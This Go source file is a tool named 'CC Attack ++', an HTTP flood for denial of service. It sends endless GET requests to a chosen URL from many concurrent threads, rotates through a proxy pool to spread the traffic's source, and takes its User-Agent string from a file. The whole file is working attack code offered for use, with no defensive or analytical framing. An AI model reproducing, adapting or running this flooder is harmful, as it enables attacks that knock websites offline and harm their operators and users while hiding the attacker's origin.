// Name : CC Attack ++ Rewrite
// Author : MasonDye
// Version : 2.1.0
// GitHub : https://github.com/MasonDye/CC-Attack-Rewrite

package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
	"net/url"
	"math/rand"
)

var version = "2.1.0 (BUILD 2023/11/15 7:30)"

func main() {
	targetURL := flag.String("url", "", "Attack URL")
	requestInterval := flag.Int("time", 100, "Attack Speed(ms)")
	userAgentFile := flag.String("ua", "", "User-Agent Config Path (txt)")
	proxyListFile := flag.String("ip", "", "IP Pool Path (txt)")
	threadCount := flag.Int("thread", 2, "thread")

	flag.Parse()

	if *targetURL == "" {
		fmt.Println("Usage:")
		flag.PrintDefaults()
		return
	}

	var proxyList []string
	if *proxyListFile != "" {
		var err error
		proxyList, err = readProxyList(*proxyListFile)
		if err != nil {
			fmt.Println("Failed to read IP Pool file:", err)
			return
		}
	}

	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
	if *userAgentFile != "" {
		userAgentList, err := readUserAgentList(*userAgentFile)
		if err != nil {
			fmt.Println("Failed to read User-Agent file:", err)
			return
		}
		userAgent = getRandomUserAgent(userAgentList)
	}

	client := &http.Client{}
	successCount := 0

	var wg sync.WaitGroup // Add Wait Group

	// Wellcome and version
	fmt.Println("\033[32mCC Attack ++ \033[31m|\033[34m Version:", version, "\033[0m")

	// Print attack start
	fmt.Println("\033[31mStart Attack!\033[0m")

	proxyIndex := 0 // Proxy Index
	proxyCount := len(proxyList) // Proxy Count

	for i := 0; i < *threadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				if proxyCount > 0 { // If proxy available
					proxyURL := getProxyFromList(proxyList, proxyIndex)

					transport := &http.Transport{
						Proxy: http.ProxyURL(proxyURL),
					}

					client.Transport = transport

					proxyIndex = (proxyIndex + 1) % proxyCount // Incrementing indexes and fetching modes to implement round-robin use of proxies
				} else {
					client.Transport = nil // No proxy, direct
				}

				req, err := http.NewRequest("GET", *targetURL, nil)
				if err != nil {
					fmt.Println("Request creation failed:", err)
					return
				}

				req.Header.Set("User-Agent", userAgent)

				resp, err := client.Do(req)
				if err != nil {
					fmt.Println("Request failed to send:", err)
					return
				}

				successCount++
				// Print attack info
				fmt.Printf("\033[31mRequested:%d \033[0m|\033[31m URL:%s \033[0m|\033[31m Thread:%d \033[0m|\033[31m Time:%d \033[0m\n", successCount, *targetURL, *threadCount, *requestInterval)

				resp.Body.Close()

				time.Sleep(time.Duration(*requestInterval) * time.Millisecond)
			}
		}()
	}

	wg.Wait() // Waiting for all co-programs to finish executing
}

func readProxyList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxyList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		proxyList = append(proxyList, proxy)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxyList, nil
}

func readUserAgentList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var userAgentList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		userAgent := strings.TrimSpace(scanner.Text())
		userAgentList = append(userAgentList, userAgent)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return userAgentList, nil
}

func getRandomProxy(proxyList []string) *url.URL {
	if len(proxyList) == 0 {
		return nil
	}

	randIndex := rand.Intn(len(proxyList))
	proxyURL, _ := url.Parse(proxyList[randIndex])
	return proxyURL
}

func getProxyFromList(proxyList []string, index int) *url.URL {
	if len(proxyList) == 0 {
		return nil
	}

	proxyURL, _ := url.Parse(proxyList[index])
	return proxyURL
}

func getRandomUserAgent(userAgentList []string) string {
	if len(userAgentList) == 0 {
		return ""
	}

	randIndex := rand.Intn(len(userAgentList))
	return userAgentList[randIndex]
}
